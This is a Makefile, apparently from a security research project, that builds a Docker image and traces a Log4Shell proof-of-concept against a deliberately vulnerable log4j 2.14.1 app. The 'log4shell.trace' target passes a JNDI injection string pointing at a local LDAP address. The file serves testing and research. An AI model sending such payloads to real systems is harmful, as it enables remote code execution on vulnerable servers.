MAKEFILE_PATH := $(abspath $(lastword $(MAKEFILE_LIST)))
MAKEFILE_DIR := $(patsubst %/,%,$(dir $(MAKEFILE_PATH)))
REPO_DIR := $(abspath $(MAKEFILE_DIR)/../)
IMAGE_NAME := trailofbits/sholva-log4shell

DOCKER := docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(shell pwd)",target=/app $(IMAGE_NAME)
.PHONY: run
run: docker
	 $(DOCKER) /bin/bash

.PHONY: log4shell.trace
log4shell.trace:
	$(MAKE) -C vulnerable-app log4shell-poc.jar
	$(DOCKER) -e RUST_LOG=debug $(IMAGE_NAME) \
		mttn --ignore-unsupported-memops java -- \
			-cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
			com.trailofbits.log4shell.PoC '$${jndi:ldap://127.0.0.1:1337/pwn}' \
		> $@

.PHONY: test
test:
	@rm -f log4shell.trace
	@$(MAKE) log4shell.trace

.PHONY: docker
docker: .last_built

OpenJDK-i386:
	$(MAKE) -C ../OpenJDK-i386 docker

.last_built: Dockerfile OpenJDK-i386
	docker build -t $(IMAGE_NAME) -f $(MAKEFILE_DIR)/Dockerfile $(MAKEFILE_DIR)
	@touch .last_built
	@echo Built $(IMAGE_NAME)

.PHONY: rebuild
rebuild: OpenJDK-i386
	docker build --no-cache -t $(IMAGE_NAME) -f $(MAKEFILE_DIR)/Dockerfile $(MAKEFILE_DIR)
	@touch .last_built
	@echo Built $(IMAGE_NAME)

.PHONY: clean
clean:
	make -C vulnerable-app clean
	@rm -f .last_built
	-docker image rm $(IMAGE_NAME)
